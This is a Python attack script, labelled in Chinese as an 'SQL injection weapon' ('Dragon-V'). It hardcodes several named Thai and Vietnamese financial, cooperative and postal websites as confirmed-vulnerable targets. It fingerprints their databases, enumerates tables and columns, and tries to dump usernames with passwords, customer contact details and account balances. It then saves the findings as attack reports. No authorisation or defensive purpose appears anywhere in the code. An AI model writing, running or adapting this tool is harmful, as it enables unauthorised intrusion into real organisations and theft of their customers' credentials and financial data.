#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SQL注入专属利用武器
SQL Injection Specialized Weapon

专门针对发现的SQL注入漏洞进行深度利用和数据库渗透
"""

import requests
import json
import re
import time
import base64
import threading
from datetime import datetime
from urllib.parse import urljoin, urlparse, quote, unquote
from concurrent.futures import ThreadPoolExecutor, as_completed

class SQLInjectionSpecializedWeapon:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
        self.results = []

        # 确认存在SQL注入漏洞的目标
        self.sql_targets = [
            {
                "name": "ThaiVivat",
                "url": "https://thaivivat.co.th",
                "confirmed_sql_injection": True,
                "database_type": "mysql",  # 预估
                "critical_tables": ["users", "customers", "accounts", "transactions", "orders"],
                "priority": "CRITICAL"
            },
            {
                "name": "CM Cooperative",
                "url": "https://cmcoop.or.th",
                "confirmed_sql_injection": True,
                "database_type": "mysql",
                "critical_tables": ["members", "customers", "accounts", "loans"],
                "priority": "HIGH"
            },
            {
                "name": "Mun Saving",
                "url": "https://munsaving.com",
                "confirmed_sql_injection": True,
                "database_type": "mysql",
                "critical_tables": ["depositors", "accounts", "transactions", "customers"],
                "priority": "HIGH"
            },
            {
                "name": "VN Post",
                "url": "https://vnpost.vn",
                "confirmed_sql_injection": True,
                "database_type": "postgresql",  # 预估
                "critical_tables": ["customers", "parcels", "orders", "employees"],
                "priority": "HIGH"
            }
        ]

    def advanced_sql_fingerprinting(self, target):
        """高级SQL指纹识别"""
        print(f"[SQL] {target['name']} - 数据库类型指纹识别")
        fingerprint_results = []

        # 数据库指纹识别payloads
        db_fingerprints = {
            "mysql": [
                "' AND version()--",
                "' AND @@version--",
                "' AND 1=1 GROUP BY concat(version(),floor(rand(0)*2)) HAVING min(0)--",
                "' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--"
            ],
            "postgresql": [
                "' AND version()--",
                "' AND SELECT version()--",
                "' AND 1 FROM pg_sleep(5)--",
                "' AND (SELECT string_agg(version(), ', ') FROM pg_settings WHERE name = 'server_version')--"
            ],
            "mssql": [
                "' AND @@version--",
                "' AND (SELECT @@version)--",
                "' AND 1=(SELECT COUNT(*) FROM sysobjects)--",
                "' AND 1=(SELECT db_name())--"
            ],
            "oracle": [
                "' AND banner FROM v$version--",
                "' AND (SELECT banner FROM v$version WHERE rownum=1)--",
                "' AND 1=(SELECT COUNT(*) FROM all_tables)--"
            ]
        }

        # 测试端点
        test_endpoints = ["/", "/search", "/user", "/profile", "/api/search", "/product"]
        test_params = ["id", "user", "name", "email", "search", "query", "username", "category"]

        for endpoint in test_endpoints:
            url = urljoin(target['url'], endpoint)
            for param in test_params:
                for db_type, payloads in db_fingerprints.items():
                    for payload in payloads:
                        try:
                            params = {param: payload}
                            response = self.session.get(url, params=params, timeout=10, verify=False)

                            # 检查数据库特征
                            db_indicators = {
                                "mysql": ["mysql", "version()", "sql syntax", "warning", "mysql_fetch"],
                                "postgresql": ["postgresql", "version()", "pg_sleep", "psql", "sql syntax"],
                                "mssql": ["sql server", "microsoft ole db", "@@version", "sysobjects"],
                                "oracle": ["oracle", "v$version", "banner", "ora-", "pl/sql"]
                            }

                            content_lower = response.text.lower()
                            detected_dbs = [db for db, indicators in db_indicators.items()
                                          if any(indicator in content_lower for indicator in indicators)]

                            if detected_dbs:
                                result = {
                                    "type": "sql_fingerprinting",
                                    "url": url,
                                    "parameter": param,
                                    "payload": payload,
                                    "detected_dbs": detected_dbs,
                                    "response_size": len(response.text),
                                    "success": True
                                }
                                fingerprint_results.append(result)
                                print(f"  [!] 数据库指纹识别: {db_type} -> {url}")

                        except Exception as e:
                            continue

        return fingerprint_results

    def sql_injection_database_enum(self, target, db_type):
        """SQL注入数据库枚举"""
        print(f"[SQL] {target['name']} - 数据库信息枚举 ({db_type})")
        enum_results = []

        # 基础信息枚举
        basic_info_payloads = {
            "mysql": [
                {
                    "payload": "' AND database()--",
                    "extract": lambda r: re.search(r"database\(\)", r.text, re.IGNORECASE) is not None
                },
                {
                    "payload": "' AND user()--",
                    "extract": lambda r: re.search(r"user\(\)", r.text, re.IGNORECASE) is not None
                },
                {
                    "payload": "' AND version()--",
                    "extract": lambda r: re.search(r"version\(\)", r.text, re.IGNORECASE) is not None
                }
            ],
            "postgresql": [
                {
                    "payload": "' AND current_database()--",
                    "extract": lambda r: re.search(r"current_database\(\)", r.text, re.IGNORECASE) is not None
                },
                {
                    "payload": "' AND current_user--",
                    "extract": lambda r: re.search(r"current_user", r.text, re.IGNORECASE) is not None
                },
                {
                    "payload": "' AND version()--",
                    "extract": lambda r: re.search(r"version\(\)", r.text, re.IGNORECASE) is not None
                }
            ],
            "mssql": [
                {
                    "payload": "' AND db_name()--",
                    "extract": lambda r: re.search(r"db_name\(\)", r.text, re.IGNORECASE) is not None
                },
                {
                    "payload": "' AND user_name()--",
                    "extract": lambda r: re.search(r"user_name\(\)", r.text, re.IGNORECASE) is not None
                }
            ]
        }

        # 枚举数据库信息
        if db_type in basic_info_payloads:
            test_endpoints = ["/", "/search", "/user"]
            test_params = ["id", "search", "query"]

            for endpoint in test_endpoints:
                url = urljoin(target['url'], endpoint)
                for param in test_params:
                    for info_payload in basic_info_payloads[db_type]:
                        try:
                            params = {param: info_payload["payload"]}
                            response = self.session.get(url, params=params, timeout=10, verify=False)

                            if info_payload["extract"](response):
                                result = {
                                    "type": "sql_database_enum",
                                    "url": url,
                                    "parameter": param,
                                    "payload": info_payload["payload"],
                                    "database_info": f"{db_type} enum success",
                                    "response_size": len(response.text),
                                    "success": True
                                }
                                enum_results.append(result)
                                print(f"  [!] 数据库枚举成功: {db_type} -> {url}")

                        except Exception as e:
                            continue

        return enum_results

    def sql_injection_table_discovery(self, target, db_type):
        """SQL注入表名发现"""
        print(f"[SQL] {target['name']} - 表名发现 ({db_type})")
        table_results = []

        # 表名猜测payloads
        table_guessing_payloads = {
            "mysql": [
                f"' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND table_name LIKE '{prefix}%')--"
                for prefix in ["user", "customer", "account", "member", "order", "transaction", "deposit", "loan", "employee"]
            ],
            "postgresql": [
                f"' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=current_schema() AND table_name LIKE '{prefix}%')--"
                for prefix in ["user", "customer", "account", "member", "order", "transaction", "deposit", "loan", "employee"]
            ]
        }

        test_endpoints = ["/", "/search", "/user"]
        test_params = ["id", "search", "query"]

        for endpoint in test_endpoints:
            url = urljoin(target['url'], endpoint)
            for param in test_params:
                if db_type in table_guessing_payloads:
                    for payload in table_guessing_payloads[db_type]:
                        try:
                            params = {param: payload}
                            response = self.session.get(url, params=params, timeout=10, verify=False)

                            # 检查是否返回数字（表数量）
                            if re.search(r'\d+', response.text):
                                result = {
                                    "type": "sql_table_discovery",
                                    "url": url,
                                    "parameter": param,
                                    "payload": payload,
                                    "table_pattern": payload.split("LIKE")[1].split("--")[0].strip(),
                                    "response_contains_number": True,
                                    "response_size": len(response.text),
                                    "success": True
                                }
                                table_results.append(result)
                                print(f"  [!] 表名发现成功: {payload.split('LIKE')[1].split('--')[0].strip()} -> {url}")

                        except Exception as e:
                            continue

        return table_results

    def sql_injection_column_extraction(self, target, db_type):
        """SQL注入列名提取"""
        print(f"[SQL] {target['name']} - 列名提取 ({db_type})")
        column_results = []

        # 关键列名payloads
        critical_columns = [
            "username", "password", "email", "phone", "name", "address", "id", "user_id",
            "customer_id", "account_number", "account_id", "balance", "amount", "amount",
            "transaction_id", "order_id", "deposit_id", "loan_id", "employee_id"
        ]

        column_payloads = {
            "mysql": [
                f"' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{table}' AND column_name='{column}')--"
                for table in target["critical_tables"]
                for column in critical_columns
            ],
            "postgresql": [
                f"' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{table}' AND column_name='{column}')--"
                for table in target["critical_tables"]
                for column in critical_columns
            ]
        }

        test_endpoints = ["/", "/search", "/user"]
        test_params = ["id", "search", "query"]

        for endpoint in test_endpoints:
            url = urljoin(target['url'], endpoint)
            for param in test_params:
                if db_type in column_payloads:
                    for payload in column_payloads[db_type][:10]:  # 限制数量避免过多请求
                        try:
                            params = {param: payload}
                            response = self.session.get(url, params=params, timeout=10, verify=False)

                            if re.search(r'\d+', response.text):
                                result = {
                                    "type": "sql_column_extraction",
                                    "url": url,
                                    "parameter": param,
                                    "payload": payload,
                                    "table_match": re.search(r"'([^']*)'", payload).group(1) if re.search(r"'([^']*)'", payload) else "unknown",
                                    "column_match": re.search(r"'([^']*)'", payload.split("AND")[-1]).group(1) if re.search(r"'([^']*)'", payload.split("AND")[-1]) else "unknown",
                                    "response_contains_number": True,
                                    "response_size": len(response.text),
                                    "success": True
                                }
                                column_results.append(result)
                                print(f"  [!] 列名提取成功: {result['table_match']}.{result['column_match']} -> {url}")

                        except Exception as e:
                            continue

        return column_results

    def sql_injection_data_dumping(self, target, db_type):
        """SQL注入数据转储"""
        print(f"[SQL] {target['name']} - 数据转储 ({db_type})")
        dump_results = []

        # 数据转储payloads
        dump_payloads = {
            "mysql": [
                {
                    "payload": "' AND (SELECT GROUP_CONCAT(username,':',password) FROM users)--",
                    "description": "转储用户名密码"
                },
                {
                    "payload": "' AND (SELECT GROUP_CONCAT(email,':',phone) FROM customers)--",
                    "description": "转储客户联系信息"
                },
                {
                    "payload": "' AND (SELECT GROUP_CONCAT(account_number,':',balance) FROM accounts)--",
                    "description": "转储账户信息"
                }
            ],
            "postgresql": [
                {
                    "payload": "' AND (SELECT string_agg(username||':'||password, ', ') FROM users)--",
                    "description": "转储用户名密码"
                },
                {
                    "payload": "' AND (SELECT string_agg(email||':'||phone, ', ') FROM customers)--",
                    "description": "转储客户联系信息"
                }
            ]
        }

        test_endpoints = ["/", "/search", "/user"]
        test_params = ["id", "search", "query"]

        for endpoint in test_endpoints:
            url = urljoin(target['url'], endpoint)
            for param in test_params:
                if db_type in dump_payloads:
                    for dump_info in dump_payloads[db_type]:
                        try:
                            params = {param: dump_info["payload"]}
                            response = self.session.get(url, params=params, timeout=15, verify=False)

                            # 检查是否返回数据
                            if len(response.text) > 100 and any(char in response.text.lower() for char in [':', ',', '@', '.']):
                                result = {
                                    "type": "sql_data_dumping",
                                    "url": url,
                                    "parameter": param,
                                    "payload": dump_info["payload"],
                                    "description": dump_info["description"],
                                    "response_size": len(response.text),
                                    "potential_data_leak": True,
                                    "success": True
                                }
                                dump_results.append(result)
                                print(f"  [!] 数据转储成功: {dump_info['description']} -> {url}")

                        except Exception as e:
                            continue

        return dump_results

    def sql_blind_injection_detection(self, target):
        """检测SQL盲注"""
        print(f"[SQL] {target['name']} - SQL盲注检测")
        blind_results = []

        # 基于时间的盲注检测
        time_payloads = [
            "' AND (SELECT SLEEP(5))--",
            "' AND WAITFOR DELAY '0:0:5'--",  # SQL Server
            "' AND pg_sleep(5)--",            # PostgreSQL
        ]

        test_endpoints = ["/", "/search", "/user"]
        test_params = ["id", "search", "query"]

        for endpoint in test_endpoints:
            url = urljoin(target['url'], endpoint)
            for param in test_params:
                for payload in time_payloads:
                    try:
                        params = {param: payload}
                        start_time = time.time()
                        response = self.session.get(url, params=params, timeout=10, verify=False)
                        elapsed_time = time.time() - start_time

                        if elapsed_time > 4:  # 延迟超过4秒
                            result = {
                                "type": "sql_blind_injection",
                                "url": url,
                                "parameter": param,
                                "payload": payload,
                                "response_time": elapsed_time,
                                "detection_method": "timing_based",
                                "success": True
                            }
                            blind_results.append(result)
                            print(f"  [!] 盲注检测成功: {payload} -> 响应时间: {elapsed_time:.2f}s -> {url}")

                    except Exception as e:
                        # 超时也可能是盲注的表现
                        if "timeout" in str(e).lower():
                            result = {
                                "type": "sql_blind_injection",
                                "url": url,
                                "parameter": param,
                                "payload": payload,
                                "detection_method": "timeout_based",
                                "success": True
                            }
                            blind_results.append(result)
                            print(f"  [!] 盲注检测成功: {payload} -> 超时 -> {url}")

        return blind_results

    def run_sql_specialized_attack(self):
        """运行SQL专属攻击"""
        print("=" * 80)
        print("SQL注入专属武器攻击开始")
        print("SQL Injection Specialized Weapon Attack")
        print("=" * 80)

        all_results = []

        for target in self.sql_targets:
            print(f"\n[SQL TARGET] {target['name']} ({target['url']})")
            print(f"优先级: {target['priority']}")
            print("-" * 60)

            target_results = {
                "target": target,
                "timestamp": datetime.now().isoformat(),
                "sql_exploitation_results": []
            }

            # 步骤1: 数据库指纹识别
            print("[STEP 1] 数据库类型指纹识别...")
            fingerprint_results = self.advanced_sql_fingerprinting(target)
            target_results["sql_exploitation_results"].extend(fingerprint_results)

            # 基于指纹识别结果进行后续攻击
            if fingerprint_results:
                # 尝试识别数据库类型
                detected_db = "mysql"  # 默认
                if any("postgresql" in result["detected_dbs"] for result in fingerprint_results):
                    detected_db = "postgresql"
                elif any("oracle" in result["detected_dbs"] for result in fingerprint_results):
                    detected_db = "oracle"
                elif any("mssql" in result["detected_dbs"] for result in fingerprint_results):
                    detected_db = "mssql"

                print(f"[INFO] 检测到数据库类型: {detected_db}")

                # 步骤2: 数据库信息枚举
                print("[STEP 2] 数据库信息枚举...")
                enum_results = self.sql_injection_database_enum(target, detected_db)
                target_results["sql_exploitation_results"].extend(enum_results)

                # 步骤3: 表名发现
                print("[STEP 3] 表名发现...")
                table_results = self.sql_injection_table_discovery(target, detected_db)
                target_results["sql_exploitation_results"].extend(table_results)

                # 步骤4: 列名提取
                print("[STEP 4] 列名提取...")
                column_results = self.sql_injection_column_extraction(target, detected_db)
                target_results["sql_exploitation_results"].extend(column_results)

                # 步骤5: 数据转储
                print("[STEP 5] 数据转储...")
                dump_results = self.sql_injection_data_dumping(target, detected_db)
                target_results["sql_exploitation_results"].extend(dump_results)

                # 步骤6: 盲注检测
                print("[STEP 6] 盲注检测...")
                blind_results = self.sql_blind_injection_detection(target)
                target_results["sql_exploitation_results"].extend(blind_results)

            # 统计结果
            successful_exploits = [r for r in target_results["sql_exploitation_results"] if r.get("success", False)]
            target_results["successful_count"] = len(successful_exploits)
            target_results["exploitation_rate"] = len(successful_exploits) / len(target_results["sql_exploitation_results"]) if target_results["sql_exploitation_results"] else 0
            target_results["risk_assessment"] = "CRITICAL" if len(successful_exploits) >= 3 else "HIGH" if len(successful_exploits) >= 1 else "MEDIUM"

            all_results.append(target_results)

            print(f"\n[SQL RESULT] {target['name']} SQL攻击完成:")
            print(f"  成功利用数: {len(successful_exploits)}")
            print(f"  利用成功率: {target_results['exploitation_rate']:.1%}")
            print(f"  风险评估: {target_results['risk_assessment']}")

            if successful_exploits:
                print("  主要攻击成果:")
                for exploit in successful_exploits[:5]:
                    print(f"    - {exploit['type']}: {exploit.get('url', 'N/A')}")

        print(f"\n=== SQL专属武器攻击完成 ===")
        print(f"攻击目标总数: {len(self.sql_targets)}")
        print(f"总攻击成功数: {sum(r['successful_count'] for r in all_results)}")
        print(f"平均成功率: {sum(r['exploitation_rate'] for r in all_results) / len(all_results):.1%}")

        self.results = all_results
        return all_results

    def generate_sql_attack_report(self):
        """生成SQL攻击报告"""
        if not self.results:
            return "没有攻击结果"

        report = []
        report.append("=" * 80)
        report.append("SQL注入专属武器攻击报告")
        report.append("SQL Injection Specialized Weapon Report")
        report.append("=" * 80)
        report.append(f"攻击时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        report.append(f"攻击目标总数: {len(self.sql_targets)}")
        report.append("")

        total_exploits = 0
        high_risk_targets = 0

        for target_result in self.results:
            target = target_result['target']
            exploits = target_result['sql_exploitation_results']
            successful_exploits = [e for e in exploits if e.get("success", False)]

            total_exploits += len(successful_exploits)
            if target_result['risk_assessment'] == "CRITICAL":
                high_risk_targets += 1

            report.append(f"目标: {target['name']} ({target['url']})")
            report.append(f"优先级: {target['priority']}")
            report.append(f"攻击成功数: {len(successful_exploits)}")
            report.append(f"攻击成功率: {target_result['exploitation_rate']:.1%}")
            report.append("")

            if successful_exploits:
                report.append("  攻击成果详情:")
                for exploit in successful_exploits[:10]:
                    report.append(f"    - {exploit['type']}:")
                    if "url" in exploit:
                        report.append(f"      目标URL: {exploit['url']}")
                    if "payload" in exploit:
                        report.append(f"      载荷: {exploit['payload']}")
                    if "description" in exploit:
                        report.append(f"      描述: {exploit['description']}")
                    if "detected_dbs" in exploit:
                        report.append(f"      检测到的数据库: {', '.join(exploit['detected_dbs'])}")
                    report.append("")

        report.append("统计总结:")
        report.append(f"- 攻击目标: {len(self.sql_targets)}")
        report.append(f"- 攻击成功: {total_exploits}")
        report.append(f"- 高风险目标: {high_risk_targets}")
        report.append(f"- 平均成功率: {sum(r['exploitation_rate'] for r in self.results) / len(self.results):.1%}")

        return "\\n".join(report)

    def save_sql_attack_results(self):
        """保存SQL攻击结果"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        json_filename = f"sql_specialized_attack_{timestamp}.json"
        txt_filename = f"sql_specialized_attack_{timestamp}.txt"

        try:
            # 保存JSON格式
            with open(json_filename, 'w', encoding='utf-8') as f:
                json.dump(self.results, f, ensure_ascii=False, indent=2)

            # 保存文本报告
            report = self.generate_sql_attack_report()
            with open(txt_filename, 'w', encoding='utf-8') as f:
                f.write(report)

            print(f"\\n[SUCCESS] SQL攻击结果已保存:")
            print(f"  JSON格式: {json_filename}")
            print(f"  文本报告: {txt_filename}")

            return json_filename, txt_filename

        except Exception as e:
            print(f"[ERROR] 保存结果失败: {e}")
            return None, None

def main():
    """主函数"""
    print("Dragon-V SQL Injection Specialized Weapon")
    print("SQL注入专属武器")
    print("=" * 50)

    weapon = SQLInjectionSpecializedWeapon()
    results = weapon.run_sql_specialized_attack()

    print("\\n" + "=" * 50)
    report = weapon.generate_sql_attack_report()
    print(report)

    weapon.save_sql_attack_results()

if __name__ == "__main__":
    main()